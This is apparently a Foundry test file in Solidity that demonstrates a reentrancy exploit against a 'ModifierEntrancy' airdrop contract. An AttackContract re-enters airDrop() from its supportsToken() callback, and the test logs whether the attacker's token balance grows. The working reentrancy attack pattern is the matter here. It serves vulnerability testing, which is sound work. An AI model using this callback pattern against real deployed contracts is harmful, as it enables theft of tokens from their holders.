// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/modifier_reentrancy.sol";

contract AttackContract {
    ModifierEntrancy public victim;
    bool private attacking;

    constructor(address _victim) {
        victim = ModifierEntrancy(_victim);
    }

    function startAttack() external {
        victim.airDrop();
    }

    function supportsToken() external returns(bytes32) {
        if (!attacking) {
            attacking = true;
            victim.airDrop();
        }
        return keccak256(abi.encodePacked("Nu Token"));
    }
}

contract ModifierEntrancyTest is Test {
    ModifierEntrancy public modifierEntrancy;
    AttackContract public attacker;

    function setUp() public {
        modifierEntrancy = new ModifierEntrancy();
        attacker = new AttackContract(address(modifierEntrancy));
    }

    function testReentrancyAttack() public {
        // BEFORE-Trigger State
        console2.log("--- BEFORE-Trigger Balance ---");
        uint initialBalance = modifierEntrancy.getTokenBalance(address(attacker));
        console2.log("Attacker pre-attack token balance:", initialBalance);
        assertEq(initialBalance, 0, "Initial balance should be zero");

        // Trigger Action
        console2.log("--- Trigger Attack ---");
        console2.log("Executing attacker.startAttack()");
        try attacker.startAttack() {
            console2.log("Attack executed without reverting");
        } catch {
            console2.log("Attack reverted during execution");
        }

        // AFTER-Trigger State
        console2.log("--- AFTER-Trigger Balance ---");
        uint finalBalance = modifierEntrancy.getTokenBalance(address(attacker));
        console2.log("Attacker post-attack token balance:", finalBalance);

        // Comparison Verdict
        if (finalBalance > initialBalance) {
            console2.log("VULNERABILITY CONFIRMED: Balance increased from %s to %s tokens", initialBalance, finalBalance);
            console2.log("Vulnerability Exists: Reentrancy attack succeeded");
        } else {
            console2.log("SECURITY CONFIRMED: Balance remains %s tokens", finalBalance);
            console2.log("Vulnerability not Exist: Reentrancy attack failed");
        }
    }

    function testDirectCallSupportsToken() public {
        vm.prank(address(attacker));
        bytes32 result = attacker.supportsToken();
        assertEq(result, keccak256(abi.encodePacked("Nu Token")), "Should return correct token hash");
    }
}